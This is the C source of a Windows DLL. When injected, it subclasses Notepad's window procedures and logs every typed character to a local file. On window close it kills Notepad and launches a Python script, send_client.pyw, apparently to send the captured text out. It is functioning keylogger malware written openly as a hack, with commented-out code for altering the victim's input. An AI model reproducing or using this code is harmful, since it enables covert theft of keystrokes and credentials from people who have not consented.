#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <string.h>

LONG_PTR previous_func = NULL;
int i = -1;
//char dest[] = "Hello this is ethan i hack you! LOL";



char* read_line(char *str, int n, FILE *stream)
{
	char *ans = fgets(str, n, stream);
	if (ans == NULL)
		return NULL;
	int newlineIndex = strcspn(str, "\n");
	str[newlineIndex] = 0;
	return str;
}

void file2buffer(char *dest) {

	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "r");
	read_line(dest, 40, fp);
}


void char2file(char c) {
	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "a+");
	const char* write_format = "%c";
	/*if (c == 8) {
		fseek(fp, i-1, SEEK_CUR);
		fprintf(fp, write_format, " ");
		fseek(fp, i, SEEK_CUR);
	}*/
	
	
	fprintf(fp, write_format, c);
	i++;
	fclose(fp);

}


LRESULT CALLBACK WindowProcParent(
	_In_ HWND   hwnd,
	_In_ UINT   uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
) {
	switch (uMsg)
	{
	case WM_CLOSE:
		WinExec("taskkill /IM \"notepad.exe\" /F", SW_HIDE);
		system("start pythonw C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\send_client.pyw");
	
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
	return 0;
}


LRESULT CALLBACK WindowProcChild(
	_In_ HWND   hwnd,
	_In_ UINT   uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
#pragma region change to "ihavk you"
	//MessageBoxW(NULL, L"3", L"myDLL", MB_OKCANCEL);
	/*
				char c;
	if (uMsg == WM_CHAR)
	{
		if (i != 37) {
			c = dest[i];
			wParam = c;
			i++;
		}
		else
			wParam = NULL;
	}*/

	//MessageBoxW(NULL, L"4", L"myDLL", MB_OKCANCEL);
#pragma endregion
	
	if (uMsg == WM_CHAR)
	{
		if (wParam == 13) {
			wParam = '\n';
			char2file(wParam);
			wParam = 13;
		}
		else
			char2file(wParam);
	}
	
	return CallWindowProcA(previous_func , hwnd, uMsg, wParam, lParam);
}

void fuckwindow() {
	HWND hparent = FindWindowExA(NULL,NULL, "Notepad", NULL );
	SetWindowLongPtrA(hparent, GWLP_WNDPROC, (LONG_PTR)WindowProcParent);
	HWND hedit = FindWindowExA(hparent,NULL,"Edit",NULL);
	previous_func = GetWindowLongPtrA(hedit, GWLP_WNDPROC);
	//MessageBoxW(NULL, L"2", L"myDLL", MB_OKCANCEL);
	SetWindowLongPtrA(hedit, GWLP_WNDPROC,(LONG_PTR)WindowProcChild);
}


BOOL APIENTRY DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
) {
	if (fdwReason==DLL_PROCESS_ATTACH)
	{
		//MessageBoxW(NULL, L"HELLO", L"myDLL", MB_OK);

		fuckwindow();
	}
	
	

	return TRUE;
	
}
